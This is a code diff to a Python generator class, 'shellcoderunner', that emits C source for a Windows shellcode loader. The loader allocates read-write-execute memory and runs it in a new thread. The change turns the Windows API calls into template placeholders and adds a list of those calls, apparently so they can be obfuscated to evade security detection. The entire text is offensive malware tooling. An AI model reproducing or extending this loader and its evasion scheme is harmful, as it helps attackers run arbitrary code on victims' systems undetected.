@@ -8,12 +8,12 @@ class shellcoderunner:
 
         if self.allocation == 'VirtualAlloc':
             self.allocationCode = """
-    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 """
         elif self.allocation == 'HeapAlloc':
             self.allocationCode = """
-    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
-    LPVOID buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
+    HANDLE hHeap = {HeapCreate}(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
+    LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
 """
 
     def imports(self) -> list[str]:
@@ -27,6 +27,15 @@ class shellcoderunner:
     def codeblocks(self) -> str:
         return """"""
 
+    def apicalls(self) -> list[str]:
+        return ['CreateThread',
+                'WaitForSingleObject',
+                'CloseHandle',
+                'VirtualAlloc',
+                'HeapAlloc',
+                'HeapCreate',
+                'VirtualFree']
+
     def template(self) -> str:
         return Template("""
     {transformers}
@@ -38,14 +47,14 @@ class shellcoderunner:
 
 
     // Create thread to run shellcode
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
+    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
 
     // Wait for thread to finish
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
+    {WaitForSingleObject}(hThread, INFINITE);
+    {CloseHandle}(hThread);
 
     // Clean up by freeing the memory we allocated for our shellcode
-    VirtualFree(buffer, 0, MEM_RELEASE);
+    {VirtualFree}(buffer, 0, MEM_RELEASE);
 
     return 0;
 """).substitute(allocation=self.allocationCode)
